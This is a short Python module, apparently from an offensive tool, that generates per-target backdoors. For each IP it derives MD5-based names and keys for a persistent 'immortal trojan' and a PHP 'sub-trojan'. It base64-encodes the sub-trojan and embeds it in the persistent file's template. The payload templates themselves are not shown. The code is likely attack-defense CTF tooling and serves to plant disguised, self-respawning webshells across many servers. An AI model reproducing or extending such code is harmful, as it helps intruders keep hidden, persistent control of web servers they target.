import hashlib
import base64
from Tools.BackDoorDescription.Description import *
class DescriptionList:
    def __init__(self,ips,path,seed,trojType,immortalTroj_tpl,subTroj_tpl):
        self.childs=[]
        for index in range(len(ips)):
            #依据ip作为种子
            raw=f'sf{ips[index]}fs{seed}'
            
            #生成别名
            md5_1=hashlib.md5(raw.encode("utf-8")).hexdigest()
            md5_2=hashlib.md5(md5_1.encode("utf-8")).hexdigest()
            
            subTroj_key=md5_1
            immortalTroj_Name=md5_1[:5]
            subTroj_Name=md5_2[:-5]
            immortalTroj_Name=f'{path}{immortalTroj_Name}.{trojType}'
            subTroj_Name=f'{path}{subTroj_Name}.php'
            
            #生成内容
            subTrojContent=subTroj_tpl.format(subTroj_key[:5],md5_2)
            subTrojContent_b64=base64.b64encode(subTrojContent.encode('utf-8')).decode('utf-8')
            immortalTroj_Content=immortalTroj_tpl.format(subTrojContent_b64,subTroj_Name)

            self.childs.append(Description(immortalTroj_Name,subTroj_Name,subTroj_key,immortalTroj_Content))
    def __getitem__(self,index):
        return self.childs[index]
    def __setitem__(self, index, value):
        self.childs[index]=value
    def __delitem__(self,index):
        del self.childs[index]